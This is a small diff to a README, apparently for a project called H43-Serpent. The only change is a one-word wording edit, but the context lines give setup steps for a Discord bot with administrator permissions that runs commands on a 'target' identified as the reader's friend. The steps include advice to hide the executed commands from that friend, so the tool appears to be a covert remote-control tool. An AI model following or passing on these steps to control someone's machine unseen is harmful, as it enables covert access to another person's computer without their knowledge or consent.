@@ -69,7 +69,7 @@ Target defined in `config.ini`
     - 2.3 Scroll down until Privileged Gateway Intents. Enable all three intents (PRESENCE, SERVER MEMBERS, MESSAGE CONTENT)
 3. Put this link on your browser and add the Application ID from 2.1 and put where it says ID: [https://discord.com/oauth2/authorize?scope=bot&permissions=8&client_id=](https://discord.com/oauth2/authorize?scope=bot&permissions=8&client_id=)`ID` and choose your server (I recommend creating a server where your friend isn't there to see the commands being executed)
 4. Download this [repository](https://github.com/Fytex/H43-Serpent/archive/refs/heads/main.zip) to your computer
-5. Unzip the archive
+5. Unzip/Extract the archive
 6. Open the folder and double click on config.ini
 7. Inside config.ini edit TARGET where it says PUT_YOUR_TARGET_HERE and replace with a simple name to represent your friend. This is to choose later which friend (target) you want to execute each command.
 8. Inside config.ini edit TOKEN where it says PUT_YOUR_TOKEN_HERE and replace with the Token that you copied in 2.2
